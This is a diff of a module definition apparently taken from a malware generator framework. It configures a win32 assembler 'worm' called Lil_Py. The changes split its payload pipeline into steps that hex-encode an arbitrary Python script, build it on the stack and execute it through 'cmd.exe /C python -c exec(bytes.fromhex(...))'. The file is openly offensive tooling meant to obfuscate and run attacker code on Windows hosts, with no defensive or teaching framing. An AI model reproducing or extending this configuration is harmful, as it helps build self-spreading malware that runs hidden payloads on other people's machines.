@@ -1,8 +1,10 @@
 #!name##Lil_Py
 #!types##worm
-#!info##A simple assembler worm. Runs a python script in the console. Places the code on the stack. It does not include DLL libraries in the executable file which makes it very small.
-#!reqPayload##LIL_script##Python Script to execute##STACK_BUILD:True##STACK_COMMAND:cmd.exe /C python -c exec(bytes.fromhex('$')) & pause
-#!payloadOpt##LIL_script##ENCODE##bytes_hex
+#!info##A simple assembler worm (win32). Runs a python script in the console. Places the code on the stack. It does not include DLL libraries in the executable file which makes it very small.
+#!reqPayload##LIL_script##Python Script to execute
+#!payStep##encode_hex
+#!payStep##asm_stack_build
+#!payloadOpt##LIL_script##asm_stack_build_cmd##cmd.exe /C python -c exec(bytes.fromhex('$')) & pause
 #!payloadOpt##LIL_script##INCLUDE_IMPORTS##True##Include import library in code
 #!lang##asm
 #!banned##module##starter##shadow##junk
